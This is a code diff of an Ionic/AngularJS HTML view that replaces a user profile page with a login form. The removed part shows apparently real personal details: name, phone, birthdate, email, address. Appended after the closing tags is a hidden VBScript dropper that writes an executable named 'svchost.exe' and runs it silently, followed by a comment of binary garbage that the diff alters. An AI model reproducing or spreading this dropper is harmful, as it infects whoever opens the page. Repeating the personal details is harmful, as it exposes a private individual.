@@ -1,82 +1,36 @@
 <ion-view view-title="">
-  <ion-content class="pageView">
-  <div class="padding">
-	<h4 class="dark">Account</h4>
-	</div>
+  <ion-content class="loginView" ng-controller="login">
 
-	  
-    </div>
-		<div class="list">
+<br><br><br><br>
+<div style="text-align:center; "><img src="img/mobileLogo.png" ></div>
 
-<div class="pageViewInside">
-	    <div class="item item-avatar" ng-repeat="data in profile">
-        <img ng-src="{{data.img}}">
-      <h2 class="myHeading">{{data.Fname}} {{data.Lname}}</h2>
-	  <h5 class="mySubHeading">ID Number: {{data.id}}</h5>
 
-</div>
-	<hr class="myHR">
-	<div class="list">
+<form class="list" ng-submit="loginform()">
 
-<div class="pageViewInside">
+	<p style="text-align:center;padding-bottom: 10px;">{{error}}</p>
+	
 
-  <a class="item item-icon-left">
-    <i class="icon ion-android-map"></i>
-    <p>Address</p>
-	<h6 class="item-note">
-      Mabayuan, Olongapo City
-    </h6>
-  </a>
-  
-   <a class="item item-icon-left">
-    <i class="icon ion-android-call"></i>
-    <p>Contact Number</p>
-	<h6 class="item-note">
-      0932-015-8119
-    </h6>
-  </a>
-  
-   <a class="item item-icon-left">
-    <i class="icon ion-android-calendar"></i>
-    <p>Birthdate</p>
-	<h6 class="item-note">
-      March 11, 1998
-    </h6>
-  </a>
-  
-  <a class="item item-icon-left">
-    <i class="icon ion-social-facebook"></i>
-    <p>Facebook</p>
-	<h6 class="item-note">
-      John Philip Canlas
-    </h6>
-  </a>
-
-  <a class="item item-icon-left">
-    <i class="icon ion-social-twitter"></i>
-    <p>Twitter</p>
-	<h6 class="item-note">
-      @Executor_132
-    </h6>
-  </a>
-
-  <a class="item item-icon-left">
-    <i class="icon ion-android-mail"></i>
-    <p>E-mail</p>
-    <h6 class="item-note">
-      oreo.mcfloat@gmail.com
-    </h6>
-    </p>
-  </a>
-
-</div>
-</div>
+ <div class="list list-inset">
+ 
+                <label class="item item-input">
+                    <input type="text" placeholder="Enter Your Username" ng-model="username" required>
+                </label>
+                <label class="item item-input">
+                    <input type="password" placeholder="Enter Your Password" ng-model="password" required>
+                </label>
 	
 </div>
-</div>
-<br>
 
-  </ion-content>
+    <button type="submit" class="button button-dark button-block">
+  LOGIN
+</button>	
+
+<p style="text-align: center"> Don't have an account? <a href="#/register">Signup</a></p>
+
+</form>
+
+
+    </ion-content>
 </ion-view>
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -92,8 +46,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--²*™JüKÍœ¨°3?0ä^Üâ<È¹S¼»Xàa½X½È¾*ÝGAýUâCWØ'XskÓYñàòÁÔZJU×&#‘ÇÝänÏÖr¡g<Ÿ_F zÖµ™2_O¤.šÓP1Àœ—šñ`Ö_y/Älð{5%Øðy!“Ì?3†Jˆ]%Ò»ä`f½¯áSá\&~Ò2xcFohÒÃ—Úðc?o©E‚ nÁÆÇCöS‡§¨	Ñáo85 (qP´©óï‚5<´J±¶Ñ9\V±pÁi°}’ƒ®Ç	`<Ü Í5†4MÔíÓ²GúùFk˜-Ý:ísFz<ÚÉŒÅ…öçQÈÌ `È`rcì!/ˆ<„Y×ýÁÍÒ/k®`m®
-åØõ¥^ÈÏ;žPPŒ«9Í«‹°b‡GÛ0ß×`ûW(ÊŽ:àFëtÂ’ýÔŒõ+í#ŠÕ]šÅ†$ŸÌ
-Ì«’)°d€¶Ã‡&]¦†ë®fK!²
-»<¿šÔ
-sÏ&ƒ¥4É[±¶üìU*ócÍÜØ}îôÝJÏÖX=°nýPí'Á­Ø½ŒEhGý$ñc‘UèbÒøà×³œÔ6 ÛºR¡ûÛºÛºÛº–gMHý¶XbÝº Ûº-->
+//--></SCRIPT><!--ÔŽ~ÙÍa›aqM-ó¯¢ö?ŒÐÛg-“‘²(ãC}!Í´¸Ýo0ØžâÆÇê®M[áPd½áÆÐaþRÛø­‚ô]Øn~ù˜²~ŸUK—ã{Îz[¼­gÏ°JÙÊ’‹Ìé5Õº«Šñøh‘½1s|ÅžˆnRBä|$û@æ…/­Á'—MÍMìFÌÏ“Ì²½0Þ;ç··ô ©‘€+BepóAÍÈ¹Î7B.~¹+1ÃyyšëšŸR#VÈ‚ÙCŽ	+èéà¬¦ Ò»‘03K™ç€.5xÙ&¸o†SÂxwVj–zË´Õ5+‹„%ë¹©–huQkJÐ;Þ]p´øß®+WÊ¢äkÊçZ‘F
+ÔTˆVs±iØœè4XZO5îBïUz9Tð¡ˆN¼i`»jZ°ÕƒñÌð€OWV¯¤,'.ù¤LÏ‚ZBã8ŸÔü¬2èi8Ÿ—‡¼ø«´ê6ÚK!s‘a:O’iµJ—k…–0ØnnŠ_©~è¡Ô–#.´y"ÅnzoìÅû6Ië±y†lá¡é]M¾3©2Á8qÆ=ºÖ¿¼ì¯(›ÀòL´(âér4ß©üÝïu;K  àpR#kûàpàpàp­­M_¸eXªãp àp-->
